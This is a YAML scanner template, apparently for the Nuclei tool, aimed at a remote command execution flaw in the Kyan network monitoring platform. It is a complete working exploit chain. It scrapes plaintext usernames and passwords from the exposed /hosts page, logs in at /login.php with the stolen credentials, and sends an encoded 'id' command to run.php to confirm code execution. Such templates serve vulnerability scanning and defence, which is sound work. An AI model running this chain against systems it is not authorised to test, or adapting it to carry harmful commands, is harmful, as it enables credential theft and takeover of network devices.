id: kyan-platform-rce
info:
  name: Kyan Network Monitoring Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a remote command execution vulnerability in Kyan network monitoring platform.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20run.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

variables:
  r2: "{{rand_text_alpha(26)}}"

http:
  - id: step-1
    method: GET
    path:
      - "{{BaseURL}}/hosts"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)"
    extractors:
      - type: regex
        internal: true
        group: 1
        name: username
        regex:
          - "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)"
      - type: regex
        internal: true
        group: 2
        name: password
        regex:
          - "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)"

  - id: step-2
    method: POST
    path:
      - "{{BaseURL}}/login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "PHPSESSID={{r2}}"
    body: "user={{username}}&passwd={{password}}&x=56&y=21"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "设备管理系统"

  - id: step-3
    method: POST
    path:
      - "{{BaseURL}}/run.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "PHPSESSID={{r2}}"
    body: "command=%09++++++id%0D%0A&textarea=++++++++++"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
